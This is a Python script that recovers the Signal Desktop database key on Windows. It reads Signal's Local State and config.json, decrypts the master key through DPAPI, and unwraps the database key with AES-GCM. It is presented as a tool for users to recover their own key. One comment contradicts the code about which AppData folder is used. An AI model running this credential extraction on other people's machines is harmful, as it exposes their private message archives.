import os
import json
import base64
import win32crypt  # From pywin32
from Crypto.Cipher import AES  # From pycryptodome

# --- A helper function to find the required application data folders ---
def get_appdata_path(local=False):
    """Gets the path to AppData\Roaming or AppData\Local."""
    # Use AppData\Local for Chromium's "Local State"
    if local:
        return os.getenv('LOCALAPPDATA')
    # Use AppData\Roaming for Signal's "config.json"
    else:
        return os.getenv('APPDATA')

def get_master_key():
    """
    Finds and decrypts the master key from Signal's "Local State" file.
    This is the key protected by Windows DPAPI.
    """
    print("-> Finding and decrypting master key...")
    try:
        # The master key is in AppData\Local, like other Chromium apps
        local_state_path = os.path.join(get_appdata_path(local=False), 'Signal', 'Local State')
        
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        # The key is Base64 encoded and stored in this JSON property
        b64_master_key = local_state['os_crypt']['encrypted_key']
        
        # Decode the key from Base64
        encrypted_master_key_bytes = base64.b64decode(b64_master_key)
        
        # The key is prefixed with 'DPAPI'. We must strip this.
        encrypted_master_key = encrypted_master_key_bytes[5:]
        
        # Use DPAPI to decrypt the master key
        master_key = win32crypt.CryptUnprotectData(encrypted_master_key, None, None, None, 0)[1]
        
        print("   [SUCCESS] Master key decrypted.")
        return master_key
        
    except Exception as e:
        print(f"   [ERROR] Failed to get master key: {e}")
        return None

def get_wrapped_db_key():
    """
    Gets the AES-encrypted database key from Signal's "config.json".
    """
    print("-> Finding wrapped database key...")
    try:
        config_path = os.path.join(get_appdata_path(), 'Signal', 'config.json')
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)
        
        # This key is what we previously tried to decrypt incorrectly
        wrapped_key_hex = config['encryptedKey']

        #
        # --- THIS IS THE CORRECTED LINE ---
        # The key in config.json is a Hex string, not Base64.
        #
        wrapped_key_bytes = bytes.fromhex(wrapped_key_hex)
        
        print("   [SUCCESS] Found and decoded wrapped key from config.json.")
        return wrapped_key_bytes

    except Exception as e:
        print(f"   [ERROR] Failed to get wrapped database key: {e}")
        return None

def decrypt_db_key(master_key, wrapped_key):
    """
    Decrypts the wrapped database key using the master key with AES-256-GCM.
    """
    print("-> Decrypting final database key with AES-256-GCM...")
    try:
        # The structure of the wrapped key:
        # v10 (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
        header = wrapped_key[:3]
        nonce = wrapped_key[3:15]
        ciphertext_with_tag = wrapped_key[15:]
        
        if header not in (b'v10', b'v11'): # Accept v10 or v11 headers
            raise ValueError(f"Unexpected header format. Expected 'v10' or 'v11', but got {header.decode('utf-8', 'ignore')}.")

        # The authentication tag is the last 16 bytes
        tag = ciphertext_with_tag[-16:]
        ciphertext = ciphertext_with_tag[:-16]

        # Create the AES-GCM cipher and decrypt
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        decrypted_key_bytes = cipher.decrypt_and_verify(ciphertext, tag)
        
        # The final result is a hex string
        final_key_hex = decrypted_key_bytes.decode('utf-8')

        print("   [SUCCESS] Final database key decrypted.")
        return f"0x{final_key_hex}"
        
    except Exception as e:
        print(f"   [ERROR] Failed to decrypt final key. The MAC tag may have failed, indicating corrupt data or a wrong master key.")
        print(f"   Details: {e}")
        return None

# --- Main execution block ---
if __name__ == "__main__":
    print("========================================")
    print("Signal Desktop Decryption Tool (June 2025)")
    print("========================================")
    
    master_key = get_master_key()
    
    if master_key:
        wrapped_key = get_wrapped_db_key()
        if wrapped_key:
            final_key = decrypt_db_key(master_key, wrapped_key)
            if final_key:
                print("\n----------------------------------------")
                print("DECRYPTION COMPLETE!")
                print("Your Signal database key is:")
                print(final_key)
                print("----------------------------------------")

    print("\nScript finished.")
    input("Press Enter to exit.")